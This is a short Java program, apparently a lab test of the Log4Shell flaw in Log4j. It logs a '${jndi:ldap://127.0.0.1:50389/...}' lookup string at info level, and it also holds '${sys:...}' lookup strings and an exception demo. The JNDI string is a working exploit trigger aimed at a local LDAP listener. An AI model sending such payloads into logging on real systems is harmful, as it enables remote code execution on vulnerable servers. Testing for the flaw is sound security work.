package com.example;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.config.Configurator;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        /* 临时修改记录的日志等级 */
        Configurator.setLevel("com.example.App", Level.DEBUG);

        String username = "${sys:user.name}";
        String str2 = "${sys:java.version}";
        String vul = "${jndi:ldap://127.0.0.1:50389/b67a28}";
        vul = "${jndi:ldap://127.0.0.1:50389/7df78d}";
//        logger.trace("跟踪信息");
//        logger.debug("调试信息");
//        logger.info("应用启动");
//        logger.warn("警告示例");
//        logger.error("错误示例");
//        logger.fatal("致命错误示例");
//        logger.trace("{}", username);
//        logger.info("{}", str2);
        logger.info("{}", vul);
//        logger.error("{}",vul);
        try {
            int x = 1 / 0;
        } catch (Exception e) {
            logger.error("发生异常", e);
        }
    }
}
